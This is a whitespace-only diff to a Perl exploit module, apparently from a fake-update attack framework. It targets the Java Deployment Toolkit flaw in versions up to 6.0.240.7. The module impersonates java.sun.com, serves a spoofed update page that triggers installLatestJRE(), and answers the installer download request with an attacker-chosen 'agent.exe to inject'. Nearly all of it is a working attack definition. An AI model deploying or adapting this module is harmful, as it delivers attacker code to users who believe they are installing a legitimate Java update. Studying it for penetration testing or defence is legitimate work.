@@ -27,26 +27,24 @@ use Data::Dump qw(dump);
 
 use isrcore::utils;
 
-my $base=
-{
-    'name' => ' Java Deployment Toolkit',
-    'version' => '1.0',
-    'appver'  => '< v6.0.240.7',
-    'author' => [ 'Francisco Amato < famato +[AT]+ infobytesec.com >' ],
+my $base = {
+    'name'        => ' Java Deployment Toolkit',
+    'version'     => '1.0',
+    'appver'      => '< v6.0.240.7',
+    'author'      => ['Francisco Amato < famato +[AT]+ infobytesec.com >'],
     'description' => qq{Found By: Neal Poole.
-			The Java Deployment Toolkit Plugin v6.0.240.7 and below for Firefox and Google Chrome can be used to download
-			and run an improperly signed executable on a target’s system. UAC, if enabled, will prompt the user before 
-			running the executable. This vulnerability has been tested and confirmed to exist on Windows 7, both 32-bit
-			and 64-bit. It was fixed in Java 7 and Java 6 Update 29.
-			https://nealpoole.com/blog/2011/10/java-deployment-toolkit-plugin-does-not-validate-installer-executable/},
-    'vh' => '(java.sun.com)',
+            The Java Deployment Toolkit Plugin v6.0.240.7 and below for Firefox and Google Chrome can be used to download
+            and run an improperly signed executable on a target’s system. UAC, if enabled, will prompt the user before
+            running the executable. This vulnerability has been tested and confirmed to exist on Windows 7, both 32-bit
+            and 64-bit. It was fixed in Java 7 and Java 6 Update 29.
+            https://nealpoole.com/blog/2011/10/java-deployment-toolkit-plugin-does-not-validate-installer-executable/},
+    'vh'      => '(java.sun.com)',
     'request' => [
-		    {
-		    'req' => '/update.html', #regex friendly
-		    'type' => 'string', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 0,
-		    'string' => '
+        {   'req'    => '/update.html',    #regex friendly
+            'type'   => 'string',          #file|string|agent|install
+            'method' => '',                #any
+            'bin'    => 0,
+            'string' => '
 <html>
 <head>
 <title>Java Deployment Toolkit update</title>
@@ -58,28 +56,31 @@ deployJava.getPlugin().installLatestJRE();
 </script>
 </body>
 </html>
-		    ',
-		    'parse' => 0,
-		    'file' => '',
-		    },
-		    
-		    {
-		    'req' => '/webapps/download/AutoDL', #regex friendly
-		    'type' => 'agent', #file|string|agent|install
-		    'method' => '', #any
-		    'bin' =>1,
-		    'string' => '',
-		    'parse' => 0,
-		    'file' => ''
-		    },
-		    
+            ',
+            'parse' => 0,
+            'file'  => '',
+        },
+
+        {   'req'    => '/webapps/download/AutoDL', #regex friendly
+            'type'   => 'agent',                    #file|string|agent|install
+            'method' => '',                         #any
+            'bin'    => 1,
+            'string' => '',
+            'parse'  => 0,
+            'file'   => ''
+        },
 
     ],
-    #Options		    
-    'options' => {  'agent'  => { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject'},
-		    'enable' => { 'val' => 1, 
-			    	  'desc' => 'Status'},
-		 }
+
+    #Options
+    'options' => {
+        'agent' =>
+            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
+        'enable' => {
+            'val'  => 1,
+            'desc' => 'Status'
+        },
+    }
 };
 
 ##########################################################################
@@ -92,5 +93,5 @@ sub new {
     my $class = shift;
     my $self = { 'Base' => $base, @_ };
     return bless $self, $class;
-}            
+}
 1;
